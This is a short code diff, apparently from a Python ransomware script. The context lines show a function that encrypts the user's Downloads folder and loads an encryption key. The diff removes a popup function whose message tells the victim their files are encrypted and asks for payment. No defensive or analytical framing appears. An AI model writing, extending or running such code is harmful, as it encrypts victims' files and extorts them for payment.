@@ -37,13 +37,6 @@ def encrypt_downloads_folder(key):
     else:
         print(f"Downloads folder does not exist: {downloads_folder}")
 
-# Function to display a ransom note popup
-def show_ransom_note_popup():
-    root = tk.Tk()
-    root.withdraw()  # Hide the main window
-    messagebox.showwarning("Important Notice", "Your files have been encrypted. To restore access, please contact us with the payment details.")
-    root.destroy()  # Close the Tkinter window
-
 # Example usage
 # Generate or load encryption key
 key_path = 'encryption_key.key'
